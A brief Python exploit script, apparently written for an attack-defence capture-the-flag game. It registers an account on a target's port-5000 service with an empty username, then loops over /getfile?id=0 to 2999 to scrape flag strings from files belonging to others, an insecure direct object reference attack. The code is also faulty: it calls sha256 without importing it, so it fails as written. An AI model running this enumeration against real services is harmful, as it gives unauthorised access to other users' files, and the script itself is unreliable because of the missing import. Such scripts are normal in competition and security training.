#!/usr/bin/env python3
import requests, json, re, sys, uuid, time, random
from bs4 import BeautifulSoup

host = sys.argv[1]
s = requests.Session()

new_password = "qwe"

req = s.post(f"http://{host}:5000/register", data={"username": "", "password": sha256(new_password.encode('utf-8')).hexdigest()})

for i in range(3000):
    req = s.get(f"http://{host}:5000/getfile?id={i}")
    flag = re.findall(r'[A-Z0-9]{31}=', req.text)
    print(flag, flush=True)
